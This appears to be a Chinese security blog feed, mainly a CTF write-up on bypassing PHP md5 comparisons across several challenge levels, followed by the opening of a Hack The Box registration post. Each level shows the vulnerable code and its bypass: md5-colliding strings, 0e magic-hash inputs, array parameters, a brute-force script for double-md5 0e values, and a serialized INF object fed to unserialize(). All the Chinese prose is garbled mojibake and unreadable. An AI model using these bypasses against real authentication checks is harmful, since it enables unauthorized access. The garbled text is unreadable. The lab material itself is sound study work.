phpä¸­çš„md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹æ•°æ®ï¼Œå¯¹äºæ•°ç»„ç±»å‹æ•°æ®è¿”å›NULLï¼Œå½“æˆ‘ä»¬ä¼ å…¥ä¸¤ä¸ªæ•°ç»„æ—¶ï¼Œå°±ä¼šå˜æˆä¸¤ä¸ªNULLï¼Œä¹Ÿå°±æ˜¯NULL==NULLï¼ŒæˆåŠŸç»•è¿‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass2/%5B%24E%24YW2%256%25U%29F3NH%60%5D%245AYE.png" alt=""><br>
<strong>md5ç¢°æ’</strong></p>
<p>åˆ©ç”¨md5ç¢°æ’ï¼Œå¾—åˆ°ä¸¤ä¸ªmd5å€¼ç›¸åŒä½†å†…å®¹å®Œå…¨ä¸ä¸€æ ·çš„å­—ç¬¦ä¸²</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸€.%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP</span><br><span class="line"></span><br><span class="line">äºŒ.%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass2/%5BX4WPN%5DT%24I6D7A4%25S4H8D%5BM.png" alt=""></p>
<h2 id="pass3"><a class="header-anchor" href="#pass3">Â¶</a>pass3</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-03.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!ctype_alpha($user) &amp;&amp; !is_numeric($pass) &amp;&amp; md5($user) == md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-04.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™å…³è¿˜æ˜¯<code>==</code>è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼Œä½†è¿™æ¬¡å¤šäº†ä¸¤ä¸ªå‡½æ•°</p>
<blockquote>
<p>ctype_alpha()ï¼š ç”¨äºæ£€æµ‹æ˜¯å¦åªåŒ…å«[A-Za-z]<br>
is_numeric()ï¼š   ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</p>
</blockquote>
<p>æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•è¿›è¡Œç»•è¿‡ï¼Œä½†ä¸€ä¸ªéœ€è¦å…¨ä¸ºæ•°å­—ï¼Œä¸€ä¸ªéœ€è¦å…¨ä¸ºå­—æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ•°å­—</span><br><span class="line">240610708  0e462097431906509019562988736854</span><br><span class="line">å­—æ¯</span><br><span class="line">QNKCDZO    0e830400451993494058024219903391</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass3/%28%604%5BRX5%40I98%29%25V_%4038NXR68.png" alt=""></p>
<h2 id="pass4"><a class="header-anchor" href="#pass4">Â¶</a>pass4</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-04.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) == md5(md5($pass)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-05.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡è¿˜æ˜¯<code>==</code>å¼±ç±»å‹æ¯”è¾ƒï¼Œä½†ä»”ç»†è§‚å¯Ÿï¼Œå‘ç°æœ‰ä¸€ä¸ªå˜é‡md5()å‡½æ•°å¤–è¿˜å¥—äº†ä¸€å±‚md5()ä¹Ÿå°±æ˜¯åŒå±‚md5ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ•°ç»„å½¢å¼è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åˆ†æé€»è¾‘ï¼š</span><br><span class="line">md5(NULL)â€”â€”&gt;d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"></span><br><span class="line">md5(md5(array()))â€”â€”&gt;md5(NULL)â€”â€”&gt;d41d8cd98f00b204e9800998ecf8427e</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬ç»™userè®¾ä¸ºç©ºï¼Œè€Œpassç»™äºˆä¸€ä¸ªæ•°ç»„ç±»å‹æ•°æ®<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass4/%60L35HRAKANK2NWRP%60DK%7BQ%407.png" alt=""></p>
<h2 id="pass5"><a class="header-anchor" href="#pass5">Â¶</a>pass5</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-05.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) === md5(md5($pass)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-06.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸ŠæŠŠ<code>==</code>å¼±ç±»å‹å˜æˆäº†<code>===</code>å¼ºç±»å‹æ¯”è¾ƒï¼Œè™½ç„¶æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œä½†æˆ‘ä»¬nullç»è¿‡md5åŠ å¯†çš„å€¼æ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥ä½¿ç”¨æ•°ç»„çš„æ–¹æ³•è¿›è¡Œç»•è¿‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass5/B%24%28%40J_R%5B%7B3FX3%297%5D2S4OFNM.png" alt=""></p>
<h2 id="pass6"><a class="header-anchor" href="#pass6">Â¶</a>pass6</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-06.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) == md5(md5($pass)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-07.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™å…³ä¸º<code>==</code>å¼±ç±»å‹æ¯”è¾ƒï¼Œä½†å’Œå‰é¢ä¸åŒçš„æ˜¯å¯¹äºä¼ å…¥çš„å‚æ•°userå’Œpasséƒ½åŠ äº†(string)å‡½æ•°è¿›è¡Œå¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•è¿›è¡Œç»•è¿‡ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰åŒå±‚md5ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ç¬¬äºŒå±‚md5åŠ å¯†åä¾ç„¶å€¼ä¸ºç§‘å­¦è®¡æ•°æ³•0eè¡¨ç¤ºçš„æ•°æ®<br>
å†™ä¸€ä¸ªå¤šçº¿ç¨‹çˆ†ç ´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: dota_st</span></span><br><span class="line"><span class="comment"># Date: 2021/2/6 17:15</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    md5 = hashlib.md5(s.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">    md5_double = hashlib.md5(md5.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (md5_double[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;0e&quot;</span> <span class="keyword">and</span> md5_double[<span class="number">2</span>:].isdigit()):</span><br><span class="line">        print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getstr</span>(<span class="params">payload, s, slen</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (len(s) == slen):</span><br><span class="line">        calc_md5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        sl = s + i</span><br><span class="line">        getstr(payload, sl, slen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">40</span>):</span><br><span class="line">        payload = string.ascii_letters + string.digits</span><br><span class="line">        getstr(payload, <span class="string">&#x27;&#x27;</span>, i)</span><br><span class="line">        cpus = multiprocessing.cpu_count()</span><br><span class="line">        stop_event = multiprocessing.Event()</span><br><span class="line">        processes = [multiprocessing.Process(target=getstr, args=(payload,</span><br><span class="line">                                                                   <span class="string">&#x27;&#x27;</span>, i))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.start()</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.join()</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘åªçˆ†å‡ºå››ä¸ªå°±åœæ­¢è„šæœ¬äº†ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…æ¥ç€ç»§ç»­è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aawBzC</span><br><span class="line">aabsbm9</span><br><span class="line">aaaabGG5T</span><br><span class="line">aaaabKGVH</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥è¿™é‡Œå˜é‡useræˆ‘ä»¬å°±ç»™å•å±‚md5åŠ å¯†å€¼ä¸ºç§‘å­¦è®¡æ•°æ³•0eè¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼Œpassç»™æˆ‘ä»¬çˆ†ç ´å‡ºæ¥åŒå±‚MD5åŠ å¯†å€¼ä¸ºç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„å­—ç¬¦ä¸²<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass6/%25Z8U%29SCWA0PH%7DLK%7D%7B%7D%29%7DABA.png" alt=""></p>
<h2 id="pass7"><a class="header-anchor" href="#pass7">Â¶</a>pass7</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-07.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user !== $pass &amp;&amp; md5($user) === md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-08.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡ä¸º<code>===</code>å¼ºç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨æ•°ç»„å½¢å¼è¿›è¡Œç»•è¿‡ï¼ŒåŸç†å‰é¢è¯´è¿‡ï¼Œè¿™é‡Œä¸å†èµ˜è¿°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass7/%7B_D3PA4EDKC3019D%5B%29%40%60N6S.png" alt=""></p>
<h2 id="pass8"><a class="header-anchor" href="#pass8">Â¶</a>pass8</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-08.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">auth</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $user;</span><br><span class="line">        <span class="keyword">public</span> $pass;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;user = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;user;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;user) &gt; <span class="number">3</span> || strlen(<span class="keyword">$this</span>-&gt;pass) &gt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;level1 is fail~~~&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user !== <span class="keyword">$this</span>-&gt;pass &amp;&amp; <span class="keyword">$this</span>-&gt;user != <span class="keyword">$this</span>-&gt;pass &amp;&amp; md5(<span class="keyword">$this</span>-&gt;user) === md5(<span class="keyword">$this</span>-&gt;pass))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;    </span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;level2 is fail~~~&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unserialize($_POST[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.ä¼ å…¥çš„å˜é‡userå’Œpassé•¿åº¦ä¸èƒ½å¤§äº3<br>
2.å¯¹ä¼ å…¥çš„å˜é‡userå¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæ³¨æ„åªæ˜¯user<br>
3.userå’Œpassè¿›è¡Œmd5åŠ å¯†åå¼ºæ¯”è¾ƒ</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨phpä¸­ä¸¤ä¸ªç‰¹å®šæ•°æ®ç±»å‹å€¼è¿›è¡Œç»•è¿‡ï¼Œä¸€ä¸ªæ˜¯<code>INF</code>ï¼Œä¸€ä¸ªæ˜¯<code>NAN</code></p>
<blockquote>
<p>INFå…·æœ‰æ— ç©·å¤§çš„å«ä¹‰ï¼Œè€ŒNANæ˜¯ä»£è¡¨ç€ä¸€ä¸ªåœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­æœªå®šä¹‰æˆ–ä¸å¯è¡¨è¿°çš„å€¼ã€‚é™¤äº†ä¸Trueä¹‹å¤–ï¼Œæ‹¿NANä¸å…¶ä»–ä»»ä½•å€¼è¿›è¡Œæ¾æ•£æ¯”è¾ƒæˆ–è€…ä¸¥æ ¼æ¯”è¾ƒè¿”å›ç»“æœéƒ½æ˜¯FALSEã€‚<br>
å› ä¸ºä»–ä»¬éƒ½æ˜¯ä¸ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸è‡ªèº«åšæ¯”è¾ƒæ—¶ï¼Œä¼šè¿”å›false</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬è¿è¡Œä¸€ä¸‹ç¨‹åºè¿›è¡Œæ¯”è¾ƒ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">&#x27;INF&#x27;</span>==INF);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&#x27;INF&#x27;</span>!==INF);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5(<span class="string">&#x27;INF&#x27;</span>)===md5(INF));</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">&#x27;INF&#x27;</span>);</span><br><span class="line"><span class="comment">#9517fd0bf8faa655990a4dffe358e13e</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(INF);</span><br><span class="line"><span class="comment">#9517fd0bf8faa655990a4dffe358e13e</span></span><br></pre></td></tr></table></figure>
<p>è¿›è¡Œåºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * User: dota_st</span></span><br><span class="line"><span class="comment"> * Date: 2021/2/6</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">auth</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> auth();</span><br><span class="line">$a-&gt;user = INF;</span><br><span class="line">$a-&gt;pass = INF;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">#è¿è¡Œåå¾—åˆ°O:4:&quot;auth&quot;:2:&#123;s:4:&quot;user&quot;;d:INF;s:4:&quot;pass&quot;;d:INF;&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass8/78R%288%25%7DZ%28N003FZZK7Q7~29.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass8/UEL%29AO%28YYT4~%5BM_~2EM4%5B8Q.png" alt=""></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack The Boxè´¦å·æ³¨å†Œ</title>
    <url>/posts/33946/</url>
    <content><![CDATA[<h2 id="å¼•è¨€"><a class="header-anchor" href="#å¼•è¨€">Â¶</a>å¼•è¨€</h2>
<p>hack the box æ˜¯ä¸€ä¸ªå¾ˆæœ‰è¶£ä¹Ÿå¾ˆå¼ºå¤§çš„ç½‘ç«™ï¼Œå¼€å§‹æ¥è§¦çš„æ—¶å€™å°±è¢«é‡Œé¢çš„å…ƒç´ ç»™å¸å¼•åˆ°äº†ï¼ŒåŒæ—¶ï¼Œç½‘ç«™çš„æ³¨å†Œä¹Ÿæ˜¯è®©äººèƒ½å¿ä¸ä½åŠ¨æ‰‹å»æ¢ç´¢ä¸€ä¸‹ï¼Œä¸‹é¢åˆ†äº«ä¸€ä¸‹è¿‡ç¨‹ã€‚</p>
<h2 id="æ­£æ–‡"><a class="header-anchor" href="#æ­£æ–‡">Â¶</a>æ­£æ–‡</h2>
<p>æ‰“å¼€ç½‘ç«™æ³¨å†Œçš„æ—¶å€™ï¼Œæç¤ºéœ€è¦è‡ªå·±å…¥ä¾µç½‘ç«™è·å–æ³¨å†Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png" alt=""></p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg" alt=""></p>
<p>åœ¨ä¸‹é¢çš„clickhereæç¤ºæˆ‘ä»¬éœ€è¦æ‰“å¼€æ§åˆ¶å°æŸ¥çœ‹ï¼Œäºæ˜¯æ‰“å¼€æ§åˆ¶å°ï¼Œå‘ç°ä¸€ä¸ªå¯ç–‘çš„jsæ–‡ä»¶ï¼Œjsæ–‡ä»¶å¸¦æœ‰inviteapiåå­—</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png" alt=""></p>
<p>è·‘å»æŸ¥çœ‹jsæ–‡ä»¶æºç </p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png" alt=""></p>
<p>å‘ç°functionï¼Œconsoleï¼Œlogç­‰å…³é”®å­—ï¼Œå¯ä»¥çŒœæµ‹åé¢makeInviteCodeæ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œéœ€è¦æˆ‘ä»¬åœ¨æ§åˆ¶å°æ‰“å°ï¼Œç„¶åæˆ‘ä»¬æºœå»æ§åˆ¶å°è¯•è¯•~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png" alt=""></p>
